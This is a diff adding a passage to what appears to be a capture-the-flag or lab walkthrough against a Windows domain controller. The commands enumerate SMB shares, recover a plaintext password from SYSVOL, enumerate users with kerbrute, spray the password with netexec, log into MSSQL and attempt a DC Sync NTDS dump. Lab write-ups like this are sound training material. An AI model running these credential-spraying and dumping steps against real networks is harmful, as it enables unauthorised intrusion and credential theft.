@@ -297,6 +297,124 @@ Unable to connect with SMB1 -- no workgroup available
 EOF
 ```
 
+Neat. Let's spider the shares with `smbmap`.
+
+```sh
+# note: IP changed to 192.168.57.40
+smbmap -H 192.168.57.40 -u info -p info #-R is not a flag
+
+<<EOF
+[+] IP: 192.168.57.40:445       Name: 192.168.57.40             Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        homes                                                   READ, WRITE     user homes
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        UpdateServicesPackages                                  READ ONLY       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+        WsusContent                                             READ ONLY       A network share to be used by Local Publishing to place published content on this WSUS system.
+        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
+
+EOF
+
+# check SYSVOL
+smbclient //192.168.57.40/SYSVOL -U 'info%info'
+
+<<EOF
+smb: \hokkaido-aerospace.com\Policies\> dir
+  .                                   D        0  Sat Nov 25 13:11:13 2023
+  ..                                  D        0  Sat Nov 25 13:17:33 2023
+  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Nov 25 13:11:13 2023
+  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Nov 25 13:11:13 2023
+
+                7699711 blocks of size 4096. 1918210 blocks available
+
+EOF
+
+# looks like we have some password_reset.txt file
+# getting file \hokkaido-aerospace.com\scripts\temp\password_reset.txt of size 27 as password_reset.txt (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
+# Start123!
+
+# sadly, SYSVOL showed no groups.xml files.
+```
+
+We stole a cred, `Start123!`... I wonder if we can login as Administrator now.
+
+```sh
+smbclient //192.168.57.40/SYSVOL -U 'Administrator%Start123!' # fails
+
+impacket-mssqlclient 'hokkaido-aerospace.com/Administrator:Start123!@192.168.57.40' -windows-auth # fails
+
+smbclient //192.168.57.40/homes -U 'info%info' # waste of time
+
+smbclient "//192.168.57.40/IPC$" -U 'info%info' # empty
+```
+
+Let's see if we can find any other users.
+
+```sh
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+mv kerbrute_linux_amd64 ./kerbrute
+chmod +x ./kerbrute
+
+./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.57.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+<<EOF
+
+info
+administrator
+discovery
+maintenance
+
+EOF
+```
+
+Neat, we found a few more. Time to brute-force SMB login.
+
+```sh
+echo "info" > users.txt
+echo "administrator" >> users.txt
+echo "discovery" >> users.txt
+echo "maintenance" >> users.txt
+
+netexec smb 192.168.57.40 -u users.txt -p 'Start123!'
+
+<<EOF
+SMB         192.168.57.40   445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
+EOF
+```
+
+Looks like `discovery:Start123!` is a legit login.
+
+Let's see if it can login to the SQL server.
+
+```sh
+impacket-mssqlclient 'hokkaido-aerospace.com/discovery:Start123!@192.168.57.40' -windows-auth
+# login works
+
+SELECT IS_SRVROLEMEMBER('sysadmin'); # nope. can't use xp_cmdshell
+
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # fails
+
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+<<EOF
+
+entity_name   subentity_name   permission_name     
+-----------   --------------   -----------------   
+server                         CONNECT SQL         
+server                         VIEW ANY DATABASE   
+
+EOF
+```
+
+Let's try a DC Sync attack.
+
+```sh
+nxc smb 192.168.57.40 -u discovery -p 'Start123!' --ntds # fails.
+```
+
 
 ## Root access
 
